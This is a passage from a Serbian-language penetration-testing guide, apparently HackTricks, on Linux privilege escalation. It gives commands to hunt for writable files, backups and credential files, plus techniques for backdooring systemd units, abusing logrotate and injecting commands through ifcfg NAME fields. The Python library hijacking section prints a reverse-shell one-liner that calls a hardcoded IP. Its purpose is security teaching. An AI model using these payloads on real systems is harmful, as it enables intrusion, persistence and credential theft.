for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete **izmeniti Tomcat servisni konfiguracioni fajl unutar /etc/systemd/,** onda možete izmeniti sledeće linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor će se izvršiti sledeći put kada se tomcat pokrene.

### Proverite foldere

Sledeći folderi mogu sadržati bekape ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Čudna lokacija/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Modifikovane datoteke u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB datoteke
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binarne datoteke u PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Veb fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backups**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on traži **više mogućih datoteka koje bi mogle sadržati lozinke**.\
**Još jedan interesantan alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koji je open source aplikacija korišćena za vraćanje mnogo lozinki uskladištenih na lokalnom računaru za Windows, Linux & Mac.

### Logs

Ako možete čitati logs, možda ćete moći pronaći **zanimljive/poverljive informacije u njima**. Što je log čudniji, to će verovatno biti zanimljiviji.\
Takođe, neki "**loše**" konfigurisani (backdoored?) **audit logs** mogu vam omogućiti da **zabeležite lozinke** unutar audit logs kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste mogli **čitati logove**, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) će biti zaista korisna.

### Shell fajlovi
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Treba да проверите и фајлове који у свом **имену** или у самом **садржају** садрже реч "**password**", као и да тражите IP адресе и e-mailове у логовима, или хешеве помоћу regex-ова.\
Нећу овде наводити како све ово урадити, али ако сте заинтересовани можете погледати последње провере које [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) извршава.

## Upisivi fajlovi

### Python library hijacking

Ако знате одакле ће се python скрипта извршавати и можете писати у тај фолдер или можете модификовати python библиотеке, можете изменити OS библиотеку и убacити backdoor (ако можете писати тамо где ће се python скрипта извршавати, копирајте и налепите os.py библиотеку).

Да бисте **ubacili backdoor u biblioteku**, само додајте на крај os.py библиотеке следећу линију (промените IP и PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate eksploatacija

Ranljivost u `logrotate` omogućava korisnicima sa **dozvolom za pisanje** na log fajl ili njegovim roditeljskim direktorijumima da potencijalno steknu eskalirane privilegije. To je zato što se `logrotate`, često pokrenut kao **root**, može manipulacijom naterati da izvrši arbitrarne fajlove, posebno u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti permisije ne samo u _/var/log_ već i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost pogađa `logrotate` verzije `3.18.0` i starije

Više detaljnih informacija o ranjivosti možete pronaći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ova ranjivost se može iskoristiti pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** pa kad god otkrijete da možete menjati logove, proverite ko upravlja tim logovima i proverite da li možete eskalirati privilegije zamenom logova symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Reference ranjivosti:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može da **zapiše** `ifcf-<whatever>` skript u _/etc/sysconfig/network-scripts_ **ili** može da **izmeni** postojeći, onda je vaš sistem **pwned**.

Network skripte, _ifcg-eth0_ na primer, koriste se za mrežne konekcije. Izgledaju tačno kao .INI files. Međutim, one su \~sourced\~ na Linuxu od strane Network Manager-a (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim network skriptama nije pravilno obrađen. Ako imate **prazan razmak u imenu, sistem pokuša da izvrši deo posle praznog razmaka**. To znači da **sve posle prvog praznog razmaka biva izvršeno kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Napomena: razmak između Network i /bin/id_)

### **init, init.d, systemd, and rc.d**

Direktorijum `/etc/init.d` je dom za **skripte** za System V init (SysVinit), **klasični Linux servis menadžment sistem**. Sadrži skripte za `start`, `stop`, `restart` i ponekad `reload` servisa. One se mogu izvršavati direktno ili preko simboličkih linkova koji se nalaze u `/etc/rc?.d/`. Alternativna putanja na Redhat sistemima je `/etc/rc.d/init.d`.

Sa druge strane, `/etc/init` je povezan sa Upstart-om, novijim sistemom za upravljanje servisima uvedenim od strane Ubuntu-a, koji koristi konfiguracione fajlove za upravljanje servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste pored Upstart konfiguracija zbog kompatibilnosnog sloja u Upstart-u.

**systemd** se pojavljuje kao moderan init i service manager, nudeći napredne funkcije kao što su pokretanje daemona po potrebi, upravljanje automount-ovima i snapshot-ovanje stanja sistema. Organizuje fajlove u `/usr/lib/systemd/` za pakete distribucije i `/etc/systemd/system/` za izmene administratora, pojednostavljujući administraciju sistema.

## Ostali trikovi

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks obično hook-uju syscall da izlože privilegovanu kernel funkcionalnost userspace manageru. Slaba autentifikacija managera (npr. provere potpisa zasnovane na FD-order ili loši šemovi lozinki) može omogućiti lokalnoj aplikaciji da se lažno predstavi kao manager i eskalira privilegije do root-a na već-root-ovanim uređajima. Saznajte više i detalje eksploatacije ovde:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery u VMware Tools/Aria Operations može izvući putanju do binarnog fajla iz komandnih linija procesa i izvršiti je sa -v u privilegovanom kontekstu. Permisivni paterni (npr. korišćenjem \S) mogu da poklope attacker-staged listeners u lokacijama u kojima je dozvoljeno pisanje (npr. /tmp/httpd), što može dovesti do izvršenja kao root (CWE-426 Untrusted Search Path).

Saznajte više i vidite generalizovani obrazac primenjiv i na druge discovery/monitoring stack-ove ovde:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Više pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najbolji alat za pronalaženje Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
